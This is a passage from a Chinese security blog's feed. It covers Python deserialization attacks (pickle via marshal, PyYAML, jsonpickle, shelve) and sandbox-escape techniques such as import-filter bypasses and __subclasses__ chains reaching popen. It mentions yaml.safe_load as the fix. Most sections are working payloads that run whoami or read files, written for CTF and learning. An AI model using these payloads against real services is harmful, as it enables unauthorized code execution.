class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果不想什么都去手写，或者也不是很熟练，可以参考</p><p><a href="https://github.com/sensepost/anapickle/blob/master/anapickle.py">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a></p><p>其中列出来不少完善的opcode，只需要按照提示修改其中的关键词，就可以使用，只不过这个脚本是利用python2，其中有些函数已经在python3下取消了，需要查看修改。</p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="Marshal"><a href="#Marshal" class="headerlink" title="Marshal"></a>Marshal</h3><p>上面扯了半天的<code>pickle</code>，那么现在看看还有啥别的序列化库吧。由于<code>pickle</code>不能序列化code对象，所以在python2.6后新增<code>marshal</code>来处理code对象的序列化。</p><pre class="line-numbers language-none"><code class="language-none">#coding:utf-8import pickle,builtins,pickletools,base64import marshalimport urllibdef foo():    import os    def fib(n):        if n &lt;&#x3D; 2:            return n        return fib(n-1) + fib(n-2)    print (fib(5))try:    pickle.dumps(foo.__code__)except Exception as e:    print(e)code_serialized &#x3D; base64.b64encode(marshal.dumps(foo.__code__))print (code_serialized)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200429162508587.png" alt="image-20200429162508587"></p><p>如何去反序列化并且执行函数。</p><pre class="line-numbers language-none"><code class="language-none">code_unserialized &#x3D; marshal.loads(base64.b64decode(code_serialized))print(code_unserialized)&lt;code object foo at 0x000001E232E27AE0, file &quot;E:&#x2F;poc.py&quot;, line 7&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">code_unserialized &#x3D; types.FunctionType(code_unserialized, globals(), &#39;&#39;)()print(code_unserialized)8None<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就可以之间获取一个opcode。</p><pre class="line-numbers language-none"><code class="language-none">ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;YwAAA...&#39;           #code对象序列化编码tRtRc__builtin__globals(tRS&#39;&#39;tR(tR.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>组合脚本</p><pre class="line-numbers language-none"><code class="language-none">import marshalimport base64def foo():    pass # Your code hereprint &quot;&quot;&quot;ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;%s&#39;tRtRc__builtin__globals(tRS&#39;&#39;tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用上面的序列化在<code>pickle</code>下尝试执行，调用os模块来执行其中的函数。</p><pre class="line-numbers language-none"><code class="language-none">def foo():    import os    return os.system(&#39;whoami&#39;)code_serialized &#x3D; base64.b64encode(marshal.dumps(foo()))print (code_serialized)payload &#x3D; b&quot;&quot;&quot;ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;6QAAAAA&#x3D;&#39;   #whomaitRtRc__builtin__globals(tRS&#39;&#39;tR(tR.&quot;&quot;&quot;data &#x3D; pickle.loads(payload)print(data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是又有一个黑名单绕过执行函数的方式。</p><h3 id="PyYAML"><a href="#PyYAML" class="headerlink" title="PyYAML"></a>PyYAML</h3><p>yaml和xml、json等类似，都是标记类语言，有自己的语法格式。各个支持yaml格式的语言都会有自己的实现来进行yaml格式的解析（读取和保存），其中PyYAML就是python的一个yaml库。</p><p>除了 YAML 格式中常规的列表、字典和字符串整形等类型转化外（基本数据类型），各个语言的 YAML 解析器或多或少都会针对其语言实现一套特殊的<strong>对象转化规则</strong>（也就是序列化和反序列化，这是关键点，是这个漏洞存在的前提)。</p><p>使用了<code>yaml.load</code>而不是<code>yaml.safe_load</code>函数来解析yaml文件的程序，<code>yaml.load</code>和<code>pickle.load</code>具有一样的功能，可以调用所有python函数。</p><p><code>yaml.load</code> 函数的作用是用来将YAML文档转化成Python对象。</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; yaml.load(&quot;&quot;&quot;- 111&quot;&quot;&quot;)[111]&gt;&gt;&gt; yaml.load(&quot;&quot;&quot;111&quot;&quot;&quot;)111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果字符串或者文件中包含多个YAML文档，那么可以使用 <code>yaml.load_all</code> 函数将它们全部反序列化</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; cp &#x3D; &quot;&quot;&quot;... aaaa... ---... bbbb... ---... cccc... &quot;&quot;&quot;&gt;&gt;&gt; yaml.load_all(cp)&lt;generator object load_all at 0x0000026FBEBDD390&gt;&gt;&gt;&gt; for i in yaml.load_all(cp):...     print(i)...aaaabbbbcccc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>yaml标签和python对象的关系，部分关系，详细<a href="https://pyyaml.org/wiki/PyYAMLDocumentation">https://pyyaml.org/wiki/PyYAMLDocumentation</a></p><pre class="line-numbers language-none"><code class="language-none">!!strstr或unicode!!mapdict!!python&#x2F;strstr!!python&#x2F;dictdict!!python&#x2F;name:module.namemodule.name!!python&#x2F;module:package.modulepackage.module!!python&#x2F;object:module.clsmodule.cls !!python&#x2F;object&#x2F;new:module.clsmodule.cls !!python&#x2F;object&#x2F;apply:module.f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以使用<code>!!python/object</code>序列化任意对象。</p><pre class="line-numbers language-none"><code class="language-none">!!python&#x2F;object:module.Class &#123; attribute: value, ... &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了支持pickle协议，提供了两种附加形式的<code>!!python/object</code>标签</p><pre class="line-numbers language-none"><code class="language-none">!!python&#x2F;object&#x2F;new:module.Classargs: [argument, ...]kwds: &#123;key: value, ...&#125;state: ...listitems: [item, ...]dictitems: [key: value, ...]!!python&#x2F;object&#x2F;apply:module.functionargs: [argument, ...]kwds: &#123;key: value, ...&#125;state: ...listitems: [item, ...]dictitems: [key: value, ...]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造一个序列化，dump的结果就是上面的标签形式。</p><pre class="line-numbers language-none"><code class="language-none">#coding:utf-8import yaml,osclass test:    def __init__(self):        os.system(&#39;whoami&#39;)payload &#x3D; yaml.dump(test())print(payload)yaml.load(payload)#misaki\user#!!python&#x2F;object:__main__.test &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接发送一个序列化值</p><pre class="line-numbers language-none"><code class="language-none">cp &#x3D; &quot;&quot;&quot;!!python&#x2F;object&#x2F;apply:os.system [&#39;whoami&#39;]&quot;&quot;&quot;#cp &#x3D; &quot;&quot;&quot;!!python&#x2F;object&#x2F;new:os.system [&#39;whoami&#39;]&quot;&quot;&quot;yaml.load(cp)#misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不过此处并不能直接使用<code>!!python/object:</code>，因为它接收的是一个dict类型的对象属性。并不接收args的列表参数。当调用<code>yaml.load</code>的时候是使用<code>!!python/object</code>来处理。</p><p>避免此问题可以使用<code>safe_load</code>来替换<code>load</code>，该函数<code>yaml.safe_load</code>将此功能限制为简单的Python对象（例如整数或列表）。</p><pre class="line-numbers language-none"><code class="language-none">cp &#x3D; &quot;&quot;&quot;!!python&#x2F;object&#x2F;apply:os.system [&#39;whoami&#39;]&quot;&quot;&quot;yaml.safe_load(cp)#yaml.constructor.ConstructorError: could not determine a constructor for the tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Jsonpickle"><a href="#Jsonpickle" class="headerlink" title="Jsonpickle"></a>Jsonpickle</h3><p>用于将任意对象序列化为JSON的Python库。<code>Jsonpickle</code>可以使用几乎所有Python对象并将该对象转换为JSON。另外，它可以将对象重新构造回Python。该对象必须可以通过模块进行全局访问，并且必须继承自对象（又称新类）。<a href="https://jsonpickle.github.io/#module-jsonpickle">https://jsonpickle.github.io/#module-jsonpickle</a></p><p>创建一个对象：</p><pre class="line-numbers language-none"><code class="language-none">class Thing(object):    def __init__(self, name):        self.name &#x3D; nameobj &#x3D; Thing(&#39;Awesome&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用<code>Jsonpickle</code>将对象转换为JSON字符串：</p><pre class="line-numbers language-none"><code class="language-none">import jsonpicklefrozen &#x3D; jsonpickle.encode(obj)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用<code>Jsonpickle</code>从JSON字符串重新创建Python对象：</p><pre class="line-numbers language-none"><code class="language-none">thawed &#x3D; jsonpickle.decode(frozen)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果使用跟原pickle相似的利用方式</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; class Thing(object):...     def __init__(self, name):...         os.system(&#39;whoami&#39;)...&gt;&gt;&gt; obj &#x3D; Thing(&#39;Awesome&#39;)misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Shelve"><a href="#Shelve" class="headerlink" title="Shelve"></a>Shelve</h3><p>shelve用处是让对象持久化，但它在序列化与反序列化的过程中使用了pickle模块，因此我们可以利用shelve会调用的pickle在反序列化过程中执行代码。</p><pre class="line-numbers language-none"><code class="language-none">import shelveimport osclass exp(object):def __reduce__(self):return (os.system(&#39;ls&#39;))file &#x3D; shelve.open(&quot;test&quot;)file[&#39;exp&#39;] &#x3D; exp()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文章参考：<a href="https://xz.aliyun.com/t/2289">Python反序列化漏洞的花式利用</a>，<a href="https://xz.aliyun.com/t/7436">pickle反序列化初探</a>，<a href="http://www.polaris-lab.com/index.php/archives/178/">Python Pickle的任意代码执行漏洞实践和Payload构造</a>，<a href="https://segmentfault.com/a/1190000013099825">Python反序列化安全问题</a>，<a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">Code-Breaking中的两个Python沙箱</a>，<a href="https://checkoway.net/musings/pickle/">Arbitrary code execution with Python pickles</a>，<a href="http://www.polaris-lab.com/index.php/archives/375/">Python PyYAML反序列化漏洞实验和Payload构造</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;反序列化库&quot;&gt;&lt;a href=&quot;#反序列化库&quot; class=&quot;headerlink&quot; title=&quot;反序列化库&quot;&gt;&lt;/a&gt;反序列化库&lt;/h2&gt;&lt;p&gt;python 序列化和反序列化使用最为频繁的是&lt;code&gt;cPickle&lt;/code&gt;和&lt;code&gt;pickle&lt;/
      
    
    </summary>
    
    
      <category term="python" scheme="https://misakikata.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python 沙箱逃逸与SSTI</title>
    <link href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/"/>
    <id>https://misakikata.github.io/2020/04/python-沙箱逃逸与SSTI/</id>
    <published>2020-04-21T01:11:03.000Z</published>
    <updated>2020-04-24T07:38:48.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="沙箱逃逸概述"><a href="#沙箱逃逸概述" class="headerlink" title="沙箱逃逸概述"></a>沙箱逃逸概述</h2><p>沙箱逃逸就是在在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限，甚至getshell的过程。</p><p>既然是想getshell，或者说是执行命令就需要一个可执行命令的包。可直接执行命令的模块有</p><pre class="line-numbers language-none"><code class="language-none">osptysubprocessplarformcommands<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有些时候，比如CTF，我们并不需要去执行命令，而是去读取目录下的flag文件即可，也就是说需要文件读取的模块来执行，常用的文件读取模块：</p><pre class="line-numbers language-none"><code class="language-none">fileopencodecsfileinput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>不过其中file只在python2中执行，左2右3。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150419.png" alt="image-20200421092433264"></p><h2 id="函数导入限制和绕过"><a href="#函数导入限制和绕过" class="headerlink" title="函数导入限制和绕过"></a>函数导入限制和绕过</h2><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p>一个受限制的环境，禁止导入敏感的包是最常见的方法，所以import一般是最容易被限制掉。</p><pre class="line-numbers language-none"><code class="language-none">import re,syspattern  &#x3D; re.compile(&#39;import\s+(os|subprocess)&#39;)match &#x3D; re.search(pattern,sys.args[1])if match:    print &quot;forbidden module import detected&quot;    raise Exception<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种简单的限制不能导入包的形式，可以中间添加空格来绕过，或者使用其他方式导入包，比如</p><pre class="line-numbers language-none"><code class="language-none">__import__importlib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>还可以使用编码的方式绕过对导入包关键字的检查，比如使用base64，python2中适用</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64encode(&quot;os&quot;)&#39;b3M&#x3D;&#39;&gt;&gt;&gt; flag &#x3D; __import__(base64.b64decode(&#39;b3M&#x3D;&#39;))&gt;&gt;&gt; flag.system(&#39;whoami&#39;)misaki\user&gt;&gt;&gt; import importlib&gt;&gt;&gt; flag &#x3D; importlib.import_module(&#39;b3M&#x3D;&#39;.decode(&#39;base64&#39;))&gt;&gt;&gt; flag.system(&#39;whoami&#39;)misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用字符串拼接的方式</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; __import__(&#39;o&#39;+&#39;s&#39;).system(&#39;who&#39;+&#39;ami&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>字符串f翻转截取</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; __import__(&#39;so&#39;[::-1]).system(&#39;whoami&#39;)misaki\user&gt;&gt;&gt; exec(&#39;)&quot;imaohw&quot;(metsys.so ;so tropmi&#39;[::-1])misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再万一，他是这么禁止的</p><pre class="line-numbers language-none"><code class="language-none">import re,syspattern  &#x3D; re.compile(&#39;import&#39;)match &#x3D; re.search(pattern,sys.args[1])if match:    print &quot;forbidden module import detected&quot;    raise Exception<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样的话，不管怎么换导入函数都会被禁止。那么是否有不直接使用import关键字来导入的方式。既然需要导入也就是只需要能执行对应的库就可以。</p><p>使用execfile，不过在这之前需要判断得到库的物理路径。如果sys模块没被禁用的话，就可以使用sys来获取物理路径。这种方式只能用在python2中，python3取消了execfile</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; execfile(&#39;&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py&#39;)  #Linux系统下默认路径&gt;&gt;&gt; system(&#39;whoami&#39;)misaki<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>python3可以利用读取文件，配合exec来执行</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; f &#x3D; open(r&#39;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;,&#39;r&#39;)&gt;&gt;&gt; exec(f.read())&gt;&gt;&gt; system(&#39;whoami&#39;)misaki#不可以执行利用exec打开读取，exec需要执行的是其中的内容，直接打开的时候exec执行的就是读取文件操作exec(&quot;open(&#39;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;,&#39;r&#39;).read()&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用with open的形式</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; with open(&#39;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;,&#39;r&#39;) as f:...     exec(f.read())...&gt;&gt;&gt; system(&#39;whoami&#39;)misaki<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用字符串拼接的方式，但是需要跟exec，eval一起利用。</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; exec(&#39;imp&#39;+&#39;ort&#39;+&#39; &#39;+&#39;os;&#39;+&#39;os.system(&quot;whoami&quot;)&#39;)misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里exec不需要导入就可以直接引用，当然不需要导入就可以引用的函数不止这一个，因为一个内建函数的原因。</p><h3 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a>__builtins__</h3><p>__builtins__即时引用，在程序还为执行代码的时候就已经加载进来了。此模块并不需要导入，可以在任何模块中执行引用。比如在python2中</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150423.png" alt="image-20200421095142948"></p><p>在python3中</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150425.png" alt="image-20200421095205061"></p><p>所以我们通过dict属性来调用这些函数，例如如下调用exec来执行其中的python语句。</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; __builtins__.__dict__[&#39;exec&#39;](&quot;print(&#39;ok&#39;)&quot;)ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过内建函数来导入包</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; __builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>万一跟上面一样，禁用了import，当然还可以使用拼接的方式</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; __builtins__.__dict__[&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果在__builtins__中，部分需要引用的函数被删除。不能直接用dict属性来调用，可以使用reload来重新加载</p><pre class="line-numbers language-none"><code class="language-none">reload(__builtin__)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果仔细看上面的图片就可以看到，在python2中reload也是__builtin__的内建函数。如果此函数被删除在python2中也不可以直接引用了。python3中reload不再是内建函数，3.4之前是imp模块下的函数，而之后是importlib模块下的函数。</p><p>所以可以直接利用imp模块来导入，python2也可以利用。</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; import imp&gt;&gt;&gt; imp.reload(__builtins__)&lt;module &#39;__builtin__&#39; (built-in)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在所上的导入模块中，系统的包都在一个默认路径下，被sys的modules存储记录。如果把其中的os模块删除就不能再去加载os模块了，这时候需要手动把os重新加载进去。一般尝试默认路径，或者sys查看存储路径</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules[&#39;os&#39;]&#x3D;&#39;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;&gt;&gt;&gt; import os&gt;&gt;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>python沙箱逃逸还是离不开继承关系和子父类关系，在查看和使用类的继承，魔法函数起到了不可比拟的作用。</p><p>先看看几个常用的魔法函数</p><pre class="line-numbers language-none"><code class="language-none">__class__返回调用的类型class A():passa &#x3D; A()print(a.__class__)  #&lt;class &#39;__main__.A&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">__mro__查看类继承的所有父类，直到objectclass A:passclass B(A):passclass C(A):passclass D(B, C):passprint(D.__mro__) #(&lt;class &#39;__main__.D&#39;&gt;, &lt;class &#39;__main__.B&#39;&gt;, &lt;class &#39;__main__.C&#39;&gt;, &lt;class &#39;__main__.A&#39;&gt;, &lt;class &#39;object&#39;&gt;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">__subclasses__获取类的所有子类class A(object):    passclass B(A):    passclass C(A):    pass    print(A.__subclasses__()) #[&lt;class &#39;__main__.B&#39;&gt;, &lt;class &#39;__main__.C&#39;&gt;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">__bases__返回所有直接父类组成的元组class A(object):passclass B(A):passprint(B.__bases__)  #(&lt;class &#39;__main__.A&#39;&gt;,)  不返回object类<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">__init__类实例创建之后调用, 对当前对象的实例的一些初始化class A:def __init__(self):        print(&#39;ok&#39;)         a &#x3D; A()  # 输出ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">__globals__能够返回函数所在模块命名空间的所有变量class A(object):def __init__(self, a, b):self.a &#x3D; aself.b &#x3D; ba.__init__.__globals__&#123;&#39;A&#39;: &lt;class &#39;__main__.A&#39;&gt;, &#39;a&#39;: &lt;__main__.A object at 0x0000000001692390&gt;, &#39;importlib&#39;: &lt;module &#39;importlib&#39; from &#39;D:\anaconda\lib\importlib\__init__.pyc&#39;&gt;, &#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;pattern&#39;: &lt;_sre.SRE_Pattern object at 0x0000000001695030&gt;, &#39;base64&#39;: &lt;module &#39;base64&#39; from &#39;D:\anaconda\lib\base64.pyc&#39;&gt;, &#39;sys&#39;: &lt;module &#39;sys&#39; (built-in)&gt;, &#39;flag&#39;: &lt;module &#39;os&#39; from &#39;D:\anaconda\lib\os.pyc&#39;&gt;, &#39;__package__&#39;: None, &#39;os&#39;: &lt;module &#39;os&#39; from &#39;D:\anaconda\lib\os.pyc&#39;&gt;, &#39;__doc__&#39;: None, &#39;match&#39;: &lt;_sre.SRE_Match object at 0x00000000039A9B28&gt;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">__getattribute__当类被调用的时候，无条件进入此函数。__getattr__对象中不存在的属性时调用class A:def __init__(self):        self.name &#x3D; &quot;Bob&quot;def __getattribute__(self,item):print(&quot;ok&quot;)a &#x3D; A()  a.name   #ok, 这时候不管调用什么属性都会返回ok，相当于拦截了属性调用。def __getattr__(self):print(&#39;getattr&#39;)a.age   #getattr  调用不存在的属性会执行，相当于处理了AttributeError。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="类继承使用"><a href="#类继承使用" class="headerlink" title="类继承使用"></a>类继承使用</h3><p>尝试利用继承关系来找到object类</p><pre class="line-numbers language-none"><code class="language-none">&quot;&quot;.__class__.__bases__   #(&lt;class &#39;object&#39;&gt;,)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前面不仅可以使用双引号，还可以利用列表或者字典类型，区别在查找类型的时候在不同的基础上查找，返回都是元组。</p><pre class="line-numbers language-none"><code class="language-none">[].__class__.__bases__&#123;&#125;.__class__.__bases__<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在object类下去查找所有的子类，然后去查找可利用类，__bases__返回是元组，使用下标获得object类。</p><pre class="line-numbers language-none"><code class="language-none">&quot;&quot;.__class__.__bases__[0].__subclasses__()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150429.png" alt="image-20200421145832381"></p><p>找到需要使用的类，其中有可以使用的类，在python3中使用</p><pre class="line-numbers language-none"><code class="language-none">&lt;class &#39;os._wrap_close&#39;&gt;,&lt;class &#39;warnings.WarningMessage&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>调用他们</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128]&lt;class &#39;os._wrap_close&#39;&gt;&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[177]&lt;class &#39;warnings.WarningMessage&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果子类过多，不好查找是第几个下标，可以使用如下来标记</p><pre class="line-numbers language-none"><code class="language-none">for i in enumerate(&quot;&quot;.__class__.__bases__[0].__subclasses__()): print i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150432.png" alt="image-20200421150812786"></p><p>先来读取一下文件，C盘下的win.ini文件</p><pre class="line-numbers language-none"><code class="language-none">&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150434.png" alt="image-20200421162023248"></p><p>从中查找是否有关于文件读取的方法，比如open，file函数。在最后找到一个popen函数。</p><pre class="line-numbers language-none"><code class="language-none">&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&quot;C:\\windows\\win.ini&quot;).read()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想直接在终端显示出来</p><pre class="line-numbers language-none"><code class="language-none">&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&quot;type C:\\windows\\win.ini&quot;).read()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150436.png" alt="image-20200423141850480"></p><p>在python2中可以使用如下形式读取文件的第一行，在python2中前面是否字符串还是元组或者字典对后面类的查找有不一样的结果。</p><pre class="line-numbers language-none"><code class="language-none">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].getline(&quot;C:\\windows\\win.ini&quot;,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行命令</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;whoami&#39;)misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是python2如果使用字符串的形式，会报如下错误，因为<code>__bases__</code>获取的并不是object类</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[59]Traceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;IndexError: list index out of range<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>只需要再去获得一次即可</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__bases__[0].__subclasses__()[59]&lt;class &#39;warnings.WarningMessage&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="特殊函数查找"><a href="#特殊函数查找" class="headerlink" title="特殊函数查找"></a>特殊函数查找</h2><h3 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h3><p>在GitHub的python页面上把自带函数全部获取目前的3.8的模块(202)</p><pre class="line-numbers 